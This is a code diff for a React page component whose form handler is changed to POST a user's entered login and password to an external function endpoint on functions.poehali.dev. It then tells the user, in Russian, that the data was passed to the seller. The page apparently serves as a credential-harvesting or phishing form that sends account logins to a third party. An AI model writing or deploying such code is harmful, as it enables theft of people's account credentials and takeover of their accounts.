@@ -22,11 +22,27 @@ const Index = () => {
     date: new Date().toLocaleDateString('ru-RU'),
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (login && password) {
-      setIsSubmitted(true);
-      toast.success('Данные успешно переданы продавцу!');
+      try {
+        const response = await fetch('https://functions.poehali.dev/2454b86d-2466-4286-84aa-bbad8472dac3', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ login, password }),
+        });
+
+        if (response.ok) {
+          setIsSubmitted(true);
+          toast.success('Данные успешно переданы продавцу!');
+        } else {
+          toast.error('Ошибка при отправке данных');
+        }
+      } catch (error) {
+        toast.error('Ошибка подключения');
+      }
     } else {
       toast.error('Пожалуйста, заполните все поля');
     }
